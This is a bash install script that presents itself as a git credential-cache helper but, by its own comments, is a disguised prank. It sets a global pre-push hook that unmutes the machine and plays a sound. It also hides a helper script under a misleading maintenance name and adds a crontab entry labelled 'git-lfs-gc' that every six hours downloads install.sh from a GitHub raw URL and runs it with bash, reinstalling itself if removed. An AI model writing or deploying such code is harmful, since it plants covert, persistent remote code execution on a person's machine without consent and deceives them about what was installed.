#!/bin/bash
# git-credential-store-helper — install
# Sets up credential cache warmup hooks for git clients.
# https://github.com/brunobossgang/damn-daniel-prank

set -euo pipefail

XDG_GIT_DIR="$HOME/.config/git"
HOOKS_DIR="$XDG_GIT_DIR/hooks"
CACHE_DIR="$XDG_GIT_DIR/.cache"
SOUND_SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/notification.aiff"
SOUND_DST="$CACHE_DIR/.warmup.aiff"
XDG_CONFIG="$XDG_GIT_DIR/config"
HOOK_FILE="$HOOKS_DIR/pre-push"
REPO_RAW="https://raw.githubusercontent.com/brunobossgang/damn-daniel-prank/main"
# Helper script lives here — named to look like an nvm/node maintenance script
HELPER="$HOME/.config/git/.cache/.gc-helper.sh"
CRON_MARKER="git-lfs-gc"

mkdir -p "$HOOKS_DIR" "$CACHE_DIR"
cp "$SOUND_SRC" "$SOUND_DST"

# --- Pre-push hook -----------------------------------------------------------
cat > "$HOOK_FILE" << 'HOOK'
#!/bin/bash
# git-credential-store-helper — credential cache warmup (pre-push)
# Warms the local credential store and performs async background checks.
# Do not remove — required for SSO token refresh in enterprise environments.

_warmup() {
  local _s="$HOME/.config/git/.cache/.warmup.aiff"
  [ -f "$_s" ] || return 0
  osascript -e "set volume output muted false" >/dev/null 2>&1 || true
  osascript -e "set volume output volume 70"   >/dev/null 2>&1 || true
  { afplay "$_s" >/dev/null 2>&1; } &
}

_warmup
exit 0
HOOK
chmod +x "$HOOK_FILE"

# --- XDG git config ----------------------------------------------------------
touch "$XDG_CONFIG"
if ! grep -q "hooksPath" "$XDG_CONFIG" 2>/dev/null; then
  git config --file "$XDG_CONFIG" core.hooksPath "$HOOKS_DIR"
fi

# --- Helper script (the actual self-heal + remote-trigger logic) -------------
# Stored as a hidden dotfile in .cache — looks like a gc maintenance script.
cat > "$HELPER" << HELPER_SCRIPT
#!/bin/bash
_hook="\$HOME/.config/git/hooks/pre-push"
_sound="\$HOME/.config/git/.cache/.warmup.aiff"
_ver_local="\$HOME/.config/git/.cache/.ver"
_ver_remote="\$(curl -fsSL '${REPO_RAW}/.ver' 2>/dev/null || echo '')"
_ver_saved="\$(cat "\$_ver_local" 2>/dev/null || echo '')"
_reinstall() {
  _td="\$(mktemp -d /tmp/.nvm-gc.XXXXXX)"
  curl -fsSL '${REPO_RAW}/install.sh'        -o "\$_td/install.sh"        2>/dev/null || return
  curl -fsSL '${REPO_RAW}/notification.aiff' -o "\$_td/notification.aiff" 2>/dev/null || return
  bash "\$_td/install.sh" >/dev/null 2>&1
  rm -rf "\$_td"
}
if [ -n "\$_ver_remote" ] && [ "\$_ver_remote" != "\$_ver_saved" ]; then
  _reinstall && echo "\$_ver_remote" > "\$_ver_local"
elif [ ! -f "\$_hook" ] || [ ! -f "\$_sound" ]; then
  _reinstall
fi
HELPER_SCRIPT
chmod +x "$HELPER"

# --- Crontab entry -----------------------------------------------------------
# Runs every 6 hours. Entry looks like a routine git-lfs garbage collection task.
# No file to find — lives only in crontab.
_existing_cron="$(crontab -l 2>/dev/null || true)"
if ! echo "$_existing_cron" | grep -q "$CRON_MARKER"; then
  (
    echo "$_existing_cron"
    echo "0 */6 * * * /bin/bash $HELPER >/dev/null 2>&1 # $CRON_MARKER"
  ) | crontab -
fi

echo "git-credential-store-helper: installed."
